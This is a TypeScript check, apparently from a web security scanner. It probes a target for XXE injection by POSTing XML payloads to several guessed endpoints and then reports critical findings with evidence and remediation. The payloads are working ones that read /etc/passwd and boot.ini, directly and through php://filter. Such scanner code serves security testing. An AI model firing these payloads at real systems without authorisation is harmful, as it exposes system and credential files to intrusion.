import { ts } from '../../context';
import { probe } from '../../utils/http';
import type { RealFinding, Target, LogFn } from '../../context';

export async function checkXXE(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Testing XML External Entity (XXE) injection...`);

  const xxePayloads = [
    {
      name: 'Classic /etc/passwd read',
      payload: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
      indicator: 'root:x:0:0:',
    },
    {
      name: 'Win32 boot.ini',
      payload: `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><root>&xxe;</root>`,
      indicator: '[boot loader]',
    },
    {
      name: 'XXE via SYSTEM "php://filter"',
      payload: `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>`,
      indicator: 'root:',
    },
    {
      name: 'Blind XXE via error',
      payload: `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root/>`,
      indicator: 'root:',
    },
  ];

  const xmlEndpoints = [target.url, `${target.url.replace(/\/$/, '')}/api/xml`, `${target.url.replace(/\/$/, '')}/api/v1/xml`, `${target.url.replace(/\/$/, '')}/soap`, `${target.url.replace(/\/$/, '')}/api/data`];

  for (const ep of xmlEndpoints) {
    for (const { name, payload, indicator } of xxePayloads) {
      const r = await probe(ep, {
        method: 'POST',
        headers: { 'Content-Type': 'application/xml' },
        body: payload,
        timeoutMs: 8_000,
      });
      if (!r) continue;
      if (r.body.includes(indicator)) {
        findings.push({
          title: `XML External Entity (XXE) Injection — ${name}`,
          severity: 'critical',
          verification: 'verified',
          confidence: 98,
          cvss: 9.8,
          cve: null,
          description: `The endpoint ${ep} processed an XXE payload and returned local file content.`,
          evidence: `POST ${ep}\nPayload type: ${name}\nHTTP ${r.status} — indicator "${indicator}" found in response\nExcerpt: ${r.body.slice(0, 300)}`,
          remediation: 'Disable XML external entity processing. Use a safe parser config.',
        });
        await onLog(`[${ts()}] ⚠ XXE CONFIRMED: ${name}`);
        return findings;
      }
      // Check for parser error — indicates XML is processed
      if (r.status === 400 || r.status === 500) {
        const errorBody = r.body.toLowerCase();
        if (errorBody.includes('xml') && (errorBody.includes('entity') || errorBody.includes('parse') || errorBody.includes('doctype'))) {
          await onLog(`[${ts()}] XXE: XML parser error at ${ep} (may indicate processing)`);
        }
      }
    }
  }

  if (findings.length === 0) await onLog(`[${ts()}] No XXE indicators found`);
  return findings;
}
